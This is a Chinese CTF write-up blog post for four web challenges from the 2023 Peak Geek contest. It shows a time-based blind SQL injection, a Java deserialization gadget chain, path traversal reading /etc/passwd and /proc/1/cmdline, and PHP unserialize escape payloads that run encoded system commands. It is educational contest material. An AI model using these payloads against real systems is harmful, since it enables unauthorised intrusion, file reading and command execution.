@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>巅峰极客 2023 Web Write Up - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="巅峰极客 2023 Web Write Up - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/07/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%202023%20Web%20Write%20Up/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-07-21T10:58:34.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>July</span>
+            <span>21,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">巅峰极客 2023 Web Write Up</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>这次排名是第十好像，不错，Web也AK了。但还是感觉自己菜<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689936966915-a376eae5-c23d-4751-9a4c-016cdb41a2a0.png#averageHue=%230c1727&clientId=u34ecbb99-e3a4-4&from=paste&height=670&id=ue5e10ba7&originHeight=837&originWidth=1246&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=267667&status=done&style=none&taskId=u1ec09df7-c30d-4372-9966-80b7ed5be5a&title=&width=996.8" alt="image.png"></p>
+<h2 id="hellosql"><a href="#hellosql" class="headerlink" title="hellosql"></a>hellosql</h2><p>过滤：union, * , sleep, benchmark，rpad，or if<br>目前的payload语句为1’ or elt(2&gt;1,xxx)，先看看盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">时间盲注，用笛卡尔积</span><br><span class="line"></span><br><span class="line">/index.php?id=1&#x27;or+elt(1&gt;2,(SELECT+group_concat(&#x27;1&#x27;)+FROM+information_schema.columns+A,+information_schema.columns+B))+or&#x27;2</span><br><span class="line"></span><br><span class="line">/index.php?id=1&#x27;or+elt(3&gt;2,(SELECT+group_concat(&#x27;1&#x27;)+FROM+information_schema.columns+A,+information_schema.columns+B))+or&#x27;2</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689936974406-4e71106f-0795-42b6-9526-ed49c2d4c4da.png#averageHue=%23f9f8f8&clientId=u34ecbb99-e3a4-4&from=paste&id=u9290b9c9&originHeight=1359&originWidth=1902&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uab8e78b1-2cfa-49f7-b1c8-4b11c5623b3&title="><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689936974357-1942c15a-8995-4c1a-a2d7-6e58dfbe2554.png#averageHue=%23f9f8f8&clientId=u34ecbb99-e3a4-4&from=paste&id=uebbe68ed&originHeight=1359&originWidth=1902&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u3830f416-c7cc-43c5-9a9c-e19b96ccf23&title="><br>脚本如上。点击就能抛出flag了</p>
+<h2 id="BabyURL"><a href="#BabyURL" class="headerlink" title="BabyURL"></a>BabyURL</h2><p>不知道为什么，我看到这一段代码感觉十分的奇妙<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689937009052-b2508248-ec72-40e7-97d2-45aafa688305.png#averageHue=%23363733&clientId=u34ecbb99-e3a4-4&from=paste&id=u1ec9d97d&originHeight=149&originWidth=710&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u439d4db1-f4ab-4907-99d5-4aabb952c7b&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689937008951-0090b432-7531-4c76-a03f-de85c23920a2.png#averageHue=%23383935&clientId=u34ecbb99-e3a4-4&from=paste&id=u94ff96a7&originHeight=114&originWidth=672&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=uedb33e67-6320-474f-b65e-8b068fbcc71&title="><br>预期应该是在visiturl里面任意文件读，绕过黑名单只需要二次反序列化即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.yancao.ctf.bean.URLHelper;</span><br><span class="line">import com.yancao.ctf.bean.URLVisiter;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtConstructor;</span><br><span class="line">import org.springframework.http.HttpEntity;</span><br><span class="line">import org.springframework.http.HttpHeaders;</span><br><span class="line">import org.springframework.http.ResponseEntity;</span><br><span class="line">import org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URI;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class SignedObjectChain &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        URLHelper urlHelper = new URLHelper(&quot; file:///F14gIsHereY0UGOTIT&quot;);</span><br><span class="line">        URLVisiter urlVisiter = new URLVisiter();</span><br><span class="line">        setFieldValue(urlHelper,&quot;visiter&quot;,urlVisiter);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        keyPairGenerator.initialize(1024);</span><br><span class="line">        KeyPair keyPair = keyPairGenerator.genKeyPair();</span><br><span class="line">        PrivateKey privateKey = keyPair.getPrivate();</span><br><span class="line">        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);</span><br><span class="line">        SignedObject signedObject = new SignedObject(urlHelper,privateKey,signingEngine);</span><br><span class="line">        POJONode jsonNodes = new POJONode(signedObject);</span><br><span class="line">        BadAttributeValueExpException exp = new BadAttributeValueExpException(1);</span><br><span class="line">        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        return base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void deserial(String data) throws Exception &#123;</span><br><span class="line">        byte[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void Base64Encode(ByteArrayOutputStream bs)&#123;</span><br><span class="line">        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        String s = new String(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(true);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>先打完反序列化，然后进入file路由读取flag，file伪协议列目录，获取flag的名字F14gIsHereY0UGOTIT<br>flag{q0IZIYutLQuwncivpPFLcyLFULuybMgV}</p>
+<h2 id="hinder"><a href="#hinder" class="headerlink" title="hinder"></a>hinder</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689937026287-74cc561a-40f5-4e05-a746-488242a29a92.png#averageHue=%232d2d2d&clientId=u34ecbb99-e3a4-4&from=paste&id=ueaa10d19&originHeight=496&originWidth=1136&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u0cd65760-e2a0-4402-8f3a-af375d00aab&title="><br>&#x2F;anything&#x2F;..&#x2F;hinder&#x2F; 绕过路径，获取&#x2F;download.action?filename&#x3D;hint<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689937026130-49c6bb06-472d-4220-9e0c-65500c079189.png#averageHue=%232f2e2e&clientId=u34ecbb99-e3a4-4&from=paste&id=uffd2141f&originHeight=555&originWidth=1234&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u9d24ed2a-77d8-4f8b-aa4f-3cbdedab72d&title="><br>随后发现是因为文件不存在，或者路径不对，因此需要..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd这样子，可以读出如下文件<br>web.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;myFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;myFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;ctf.hinder.myFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+<p>METAINF<br>stucts.xml<br>感觉像是逃逸<br>非预期，看&#x2F;proc&#x2F;1&#x2F;cmdline,看到了run.sh<br>然后run.sh里面有flag名字<br>flag{09CpthqhCiti10YxOcntJO0Ucch3QLQ8}</p>
+<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p><a target="_blank" rel="noopener" href="http://www.zip源码泄漏,反序列化字符逃逸,a和b会进行字符替换./">www.zip源码泄漏，反序列化字符逃逸，a和b会进行字符替换。</a><br>利用点在pull_it的析构函数里，取反绕过一下析构函数的过滤，字符长度变短的字符逃逸，手动构造一下Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line"></span><br><span class="line">pwd=&quot;;s:12:&quot;%00push_it%00pwd&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A13%3A%22%28%7E%8F%97%8F%96%91%99%90%29%28%29%3B%22%3B%7D&#125;</span><br></pre></td></tr></table></figure>
+<p>但是在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$login = @unserialize(a($_SESSION[&#x27;login&#x27;]));</span><br><span class="line">echo $login;</span><br></pre></td></tr></table></figure>
+<p>会因为__toString没有返回一个字符串导致报错，Fast Destruct数组绕一下，构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=1&quot;;s:12:&quot;%00push_it%00pwd&quot;;a:2:&#123;i:1;O:7:&quot;pull_it&quot;:1:&#123;s:10:&quot;%00pull_it%00x&quot;;s:22:&quot;(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&quot;;&#125;;i:1;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>先index后login<br>flag{6TbutvDVCMDeR8q9Kb4cCQBlIAgJGYLM}</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/07/22/DASCTF%202023%20&amp;%200X401%20Web%20WriteUp/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">DASCTF 2023 &amp; 0X401 Web WriteUp</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/07/16/CodeQL%E5%AD%A6%E4%B9%A0/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">使用CodeQL进行利用链挖掘</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
